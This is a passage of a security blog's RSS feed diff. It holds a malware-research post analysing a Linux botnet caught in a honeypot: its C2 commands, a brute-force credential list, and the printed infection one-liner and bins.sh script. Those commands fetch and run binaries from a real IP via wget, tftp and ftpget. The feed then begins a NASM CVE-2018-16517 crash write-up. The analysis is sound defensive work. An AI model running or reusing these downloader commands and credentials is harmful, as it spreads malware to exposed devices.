+&lt;p&gt;Available commands:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GETLOCALIP
+SCANNER ON | OFF
+HOLD
+JUNK
+HTTP
+COMBO
+KILLATTK
+FUCKOFF
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Below is the connection to the CNC:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Trying 5.135.209.121...
+Connected to ip121.ip-5-135-209.eu.
+Escape character is '^]'.
+!* SCANNER ON
+PING
+PONG
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If you try to connect for the 2nd time, this will be output.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Trying 5.135.209.121...
+Connected to ip121.ip-5-135-209.eu.
+Escape character is '^]'.
+!* LOLNOGTFO
+Connection closed by foreign host.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;However, the CNC can be connected again after a few seconds.&lt;/p&gt;
+
+&lt;p&gt;The binary spread by bruteforcing the login for a random IP addresses.&lt;/p&gt;
+
+&lt;p&gt;List of usernames:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root
+admin
+user
+login
+guest
+support
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;List of passwords:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root
+toor
+admin
+user
+guest
+login
+changeme
+1234
+12345
+123456
+default
+password
+support
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once logged in, it will execute the following commands:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 5.135.209.121 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 5.135.209.121; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 23 5.135.209.121 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Inside bins.sh, more binary will be fetch&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-e #!/bin/bash
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/sshd; chmod +x sshd; ./sshd; rm -rf sshd
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/openssh; chmod +x openssh; ./openssh; rm -rf openssh
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/bash; chmod +x bash; ./bash; rm -rf bash
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/tftp; chmod +x tftp; ./tftp; rm -rf tftp
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/wget; chmod +x wget; ./wget; rm -rf wget
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/cron; chmod +x cron; ./cron; rm -rf cron
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/ftp; chmod +x ftp; ./ftp; rm -rf ftp
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/pftp; chmod +x pftp; ./pftp; rm -rf pftp
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/sh; chmod +x sh; ./sh; rm -rf sh
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/' '; chmod +x ' '; ./' '; rm -rf ' '
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/apache2; chmod +x apache2; ./apache2; rm -rf apache2
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.135.209.121/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Thu, 06 Sep 2018 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/blog/b08f9dc5784532be5b3f695f37c7781b/</link>
+        <guid isPermaLink="true">http://localhost:4000/blog/b08f9dc5784532be5b3f695f37c7781b/</guid>
+        
+        <category>malware research</category>
+        
+        <category>reverse engineering</category>
+        
+        <category>honeypot</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
+    
+      <item>
+        <title>[CVE-2018-16517] Netwide Assembler (NASM) 2.14rc15 NULL Pointer Dereference (PoC)</title>
+        <description>&lt;p&gt;The bug is pretty much straightforward and can be triggered with a single line of assembly instruction.&lt;/p&gt;
+
+&lt;p&gt;Credit goes to &lt;a href=&quot;https://twitter.com/zeifan&quot;&gt;@zeifan&lt;/a&gt; for discovering this vulnerability by using the AFL fuzzer.&lt;/p&gt;
+
+&lt;h1 id=&quot;proof-of-crash&quot;&gt;Proof-of-Crash&lt;/h1&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. echo &quot;equ   push  rax&quot; &amp;gt; poc
+2. nasm -f elf poc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* an instruction itself */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;cm&quot;&gt;/* the label defined, or NULL */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;prefixes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MAXPREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* instruction prefixes, if any */&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opcode&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;opcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;cm&quot;&gt;/* the opcode - not just the string */&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ccode&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;condition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;              &lt;span class=&quot;cm&quot;&gt;/* the condition code, if Jcc/SETcc */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;operands&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;cm&quot;&gt;/* how many operands? 0-3 (more if db et al) */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;addr_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;              &lt;span class=&quot;cm&quot;&gt;/* address size */&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;operand&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;oprs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MAX_OPERANDS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;     &lt;span class=&quot;cm&quot;&gt;/* the operands, defined as above */&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;extop&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                  &lt;span class=&quot;cm&quot;&gt;/* extended operands */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;eops_float&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;             &lt;span class=&quot;cm&quot;&gt;/* true if DD and floating */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int32_t&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                  &lt;span class=&quot;cm&quot;&gt;/* repeat count (TIMES prefix) */&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;forw_ref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;cm&quot;&gt;/* is there a forward reference? */&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;rex_done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;cm&quot;&gt;/* REX prefix emitted? */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;rex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                    &lt;span class=&quot;cm&quot;&gt;/* Special REX Prefix */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;vexreg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;cm&quot;&gt;/* Register encoded in VEX prefix */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;vex_cm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;cm&quot;&gt;/* Class and M field for VEX prefix */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;vex_wlp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;cm&quot;&gt;/* W, P and L information for VEX prefix */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;evex_p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;              &lt;span class=&quot;cm&quot;&gt;/* EVEX.P0: [RXB,R',00,mm], P1: [W,vvvv,1,pp] */&lt;/span&gt;
+                                            &lt;span class=&quot;cm&quot;&gt;/* EVEX.P2: [z,L'L,b,V',aaa] */&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ttypes&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;evex_tuple&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;             &lt;span class=&quot;cm&quot;&gt;/* Tuple type for compressed Disp8*N */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;evex_rm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;cm&quot;&gt;/* static rounding mode for AVX512 (EVEX) */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int8_t&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;evex_brerop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;            &lt;span class=&quot;cm&quot;&gt;/* BR/ER/SAE operand position */&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;assemble_file&lt;/code&gt; function, there is an object (output_ins) to a structure (struct insn) which contains the informations regarding the opcode being parsed.
+Inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;assemble_file&lt;/code&gt;, a function &lt;code class=&quot;highlighter-rouge&quot;&gt;parse_line&lt;/code&gt; is called in order to initialize the object.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;assemble_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StrList&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;depend_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prev_offset_changed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stall_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Make sure we make forward progress... */&lt;/span&gt;
+
+    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;preproc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;globallineno&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nasm_limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LIMIT_LINES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;nasm_fatal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                           &lt;span class=&quot;s&quot;&gt;&quot;overall line count exceeds the maximum %&quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PRId64&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                           &lt;span class=&quot;n&quot;&gt;nasm_limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LIMIT_LINES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+
+            &lt;span class=&quot;cm&quot;&gt;/*
+             * Here we parse our directives; this is not handled by the
+             * main parser.
+             */&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_directives&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end_of_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Just do final cleanup */&lt;/span&gt;
+
+            &lt;span class=&quot;cm&quot;&gt;/* Not a directive, or even something that starts with [ */&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;parse_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pass1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optimizing&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;forwref&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;globallineno&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;forwref&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lineno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;forw_ref&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here the structure’s member &lt;code class=&quot;highlighter-rouge&quot;&gt;label&lt;/code&gt; which should be containing the definition of the label and it is clearly being assigned to NULL.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;parse_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insn_is_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eval_hints&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hints&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opnum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;critical&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recover&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;nasm_static_assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P_none&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;nl&quot;&gt;restart_parse:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;first&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;forw_ref&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;stdscan_reset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;stdscan_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdscan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tokval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prefixes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P_none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prefixes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;times&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* No TIMES either yet */&lt;/span&gt;
